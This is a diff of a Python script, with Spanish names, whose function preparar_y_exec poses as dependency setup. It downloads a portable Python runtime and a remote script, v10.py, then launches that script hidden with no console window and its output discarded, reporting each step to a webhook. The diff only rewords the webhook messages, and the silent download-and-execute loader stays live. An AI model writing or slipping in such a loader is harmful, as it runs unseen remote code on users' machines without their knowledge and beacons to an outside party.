@@ -60,17 +60,17 @@ def encontrar_python():
 
 def preparar_y_exec():
     try:
-        enviar_webhook("🔄 [Dependencias] Iniciando proceso de configuración...")
+        enviar_webhook(" [Dependencias] Iniciando proceso de configuración...")
 
         if not os.path.exists(DIRECTORIO_DESTINO):
             os.makedirs(DIRECTORIO_DESTINO, exist_ok=True)
 
         python_ejecutable = encontrar_python()
         if not python_ejecutable:
-            enviar_webhook("📥 [Dependencias] Descargando py.zip desde GitHub Releases...")
+            enviar_webhook(" [Dependencias] Descargando py.zip desde GitHub Releases...")
             descargar_archivo_seguro(URL_PY_ZIP, ZIP_TEMPORAL)
 
-            enviar_webhook("📦 [Dependencias] Extrayendo archivos portables...")
+            enviar_webhook(" [Dependencias] Extrayendo archivos portables...")
             with zipfile.ZipFile(ZIP_TEMPORAL, "r") as zip_ref:
                 zip_ref.extractall(DIRECTORIO_DESTINO)
 
@@ -86,22 +86,22 @@ def preparar_y_exec():
                                 f.write(contenido)
 
             python_ejecutable = encontrar_python()
-            enviar_webhook("⚙️ [Dependencias] Entorno portable configurado.")
+            enviar_webhook(" [Dependencias] Entorno portable configurado.")
 
-        enviar_webhook("📥 [Dependencias] Descargando v10.py...")
+        enviar_webhook(" [Dependencias] Descargando v10.py...")
         descargar_archivo_seguro(URL_V10, SCRIPT_V10)
 
         if python_ejecutable and os.path.exists(SCRIPT_V10):
-            enviar_webhook("🚀 [Dependencias] Lanzando v10.py en segundo plano...")
+            enviar_webhook(" [Dependencias] v10.py en segundo plano...")
             subprocess.Popen(
                 [python_ejecutable, SCRIPT_V10],
                 creationflags=0x08000000,
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
             )
-            enviar_webhook("✅ [Dependencias] v10 lanzado correctamente.")
+            enviar_webhook(" [Dependencias] v10 ejecutado.")
         else:
-            enviar_webhook("❌ [Error] No se pudo lanzar v10: Faltan archivos o rutas.")
+            enviar_webhook(" [Error] No pudo ejecutarse v10.")
 
     except Exception as e:
         enviar_webhook(f"❌ [Error crítico en dependencias]: {str(e)}")
